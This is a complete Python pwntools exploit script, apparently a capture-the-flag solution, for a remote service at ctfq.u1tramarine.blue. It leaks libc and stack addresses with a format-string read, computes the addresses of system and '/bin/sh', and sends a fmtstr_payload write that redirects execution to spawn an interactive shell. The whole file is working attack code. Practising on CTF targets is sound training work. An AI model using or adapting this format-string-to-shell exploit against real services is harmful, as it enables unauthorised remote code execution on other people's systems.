#!/usr/bin/env python3
# villager B

from pwn import *
import re

def usage():
    print('usage: {} <libc_addr> <stack_addr>'.format(sys.argv[0]))
    exit(1)

def pack(x):
    return p32(int(x))

def unpack(s):
    return u32(s)

# connect
with remote('ctfq.u1tramarine.blue', 10023) as p:
    p.recvuntil(b'?\n')
    p.send(b'%2$p %78$p\n') # <= 自動化したいいいいい
    addr = p.recvline()
    addrs = re.findall(r'0x\w+', str(addr))

    if len(addrs) < 2:
        print('[!] Error : Failed to obtain address...\n')
        p.close()
        exit(0)

    base_of_libc = int(addrs[0], 16) - 0x1a3580
    stack_addr = int(addrs[1], 16) - 0x2c

    print('[*] Address of base_of_libc : {}\n'.format(hex(base_of_libc)))
    print('[*] Address of stack        : {}\n'.format(hex(stack_addr)))

    system_addr = base_of_libc + 0x3fe70
    bin_sh = base_of_libc + 0x1535aa

    writes = { stack_addr : system_addr, stack_addr+0x4 : 0x0, stack_addr+0x8 : bin_sh} 

    payload = fmtstr_payload(7, writes, numbwritten=0, write_size='short')
    p.recvuntil(b'?\n')

    print('[*] payload : [{}]\n'.format(payload))
    p.send(payload)
    p.send(b'\n')
    p.interactive()
    
# End of connection
